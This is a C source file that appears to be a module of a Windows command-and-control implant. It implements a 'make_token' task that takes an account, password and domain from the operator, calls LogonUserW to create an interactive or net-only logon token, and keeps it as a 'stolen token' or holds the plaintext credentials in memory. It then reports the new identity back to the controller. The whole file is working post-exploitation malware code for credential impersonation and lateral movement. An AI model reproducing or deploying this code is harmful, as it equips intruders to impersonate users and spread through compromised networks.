#define _WIN32_WINNT 0x0600
#include "Checkin.h"
#include "commands.h"
#include "utils.h"

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <windows.h>

#ifdef INCLUDE_CMD_MAKE_TOKEN

static int json_get_bool(const char *json, const char *key, int default_value) {
  char pattern[64];
  snprintf(pattern, sizeof(pattern), "\"%s\"", key);

  const char *key_ptr = strstr(json, pattern);
  if (!key_ptr)
    return default_value;

  const char *val_ptr = strchr(key_ptr, ':');
  if (!val_ptr)
    return default_value;

  val_ptr++;
  while (*val_ptr == ' ' || *val_ptr == '\t')
    val_ptr++;

  if (strncmp(val_ptr, "true", 4) == 0)
    return 1;
  if (strncmp(val_ptr, "false", 5) == 0)
    return 0;
  return default_value;
}

void command_make_token(char *task_id, char *params) {
  char username[256] = {0};
  char password[512] = {0};
  char domain[256] = {0};
  int net_only = 1;

  if (params[0] != '{') {
    send_task_response(task_id, "Error: make_token expects JSON parameters");
    return;
  }

  extract_json_string(params, "account", username, sizeof(username));
  extract_json_string(params, "credential", password, sizeof(password));
  extract_json_string(params, "realm", domain, sizeof(domain));
  net_only = json_get_bool(params, "netOnly", 1);

  if (username[0] == '\0') {
    send_task_response(task_id, "Error: account name is empty");
    return;
  }

  if (domain[0] == '\0' && strchr(username, '@') == NULL) {
    send_task_response(task_id, "Error: domain/realm is empty");
    return;
  }

  wchar_t wusername[256];
  wchar_t wpassword[512];
  wchar_t wdomain[256];
  MultiByteToWideChar(CP_ACP, 0, username, -1, wusername, 256);
  MultiByteToWideChar(CP_ACP, 0, password, -1, wpassword, 512);
  if (domain[0] != '\0') {
    MultiByteToWideChar(CP_ACP, 0, domain, -1, wdomain, 256);
  }

  HANDLE hToken = NULL;
  BOOL ok = LogonUserW(
      wusername,
      domain[0] != '\0' ? wdomain : NULL,
      wpassword,
      net_only ? LOGON32_LOGON_NEW_CREDENTIALS : LOGON32_LOGON_INTERACTIVE,
      net_only ? LOGON32_PROVIDER_WINNT50 : LOGON32_PROVIDER_DEFAULT,
      &hToken);

  if (!ok || hToken == NULL) {
    char msg[256];
    if (domain[0] != '\0') {
      snprintf(msg, sizeof(msg),
               "Error: LogonUserA failed for %s\\%s (err %lu)",
               domain, username, GetLastError());
    } else {
      snprintf(msg, sizeof(msg),
               "Error: LogonUserA failed for %s (err %lu)",
               username, GetLastError());
    }
    send_task_response(task_id, msg);
    return;
  }

  if (g_stolen_token != NULL) {
    CloseHandle(g_stolen_token);
    RevertToSelf();
  }
  g_stolen_token = NULL;
  clear_netonly_state();

  if (net_only) {
    CloseHandle(hToken);
    g_netonly_active = 1;
    strncpy(g_netonly_username, username, sizeof(g_netonly_username) - 1);
    strncpy(g_netonly_domain, domain, sizeof(g_netonly_domain) - 1);
    strncpy(g_netonly_password, password, sizeof(g_netonly_password) - 1);
  } else {
    g_stolen_token = hToken;
  }

  char display_user[512] = {0};
  get_current_display_user(display_user, sizeof(display_user));
  CheckinSend(display_user);

  char msg[1024];
  if (net_only) {
    snprintf(msg, sizeof(msg),
             "Created net-only token for %s%s%s.\n"
             "Subsequent spawned commands will use these credentials for remote access while keeping the local identity.\n"
             "Identity updated to: %s",
             domain, domain[0] != '\0' ? "\\" : "", username, display_user);
  } else {
    snprintf(msg, sizeof(msg),
             "Created interactive token for %s%s%s.\n"
             "Subsequent spawned commands will run with this token.\n"
             "Identity updated to: %s",
             domain, domain[0] != '\0' ? "\\" : "", username, display_user);
  }
  send_task_response(task_id, msg);
}

#endif
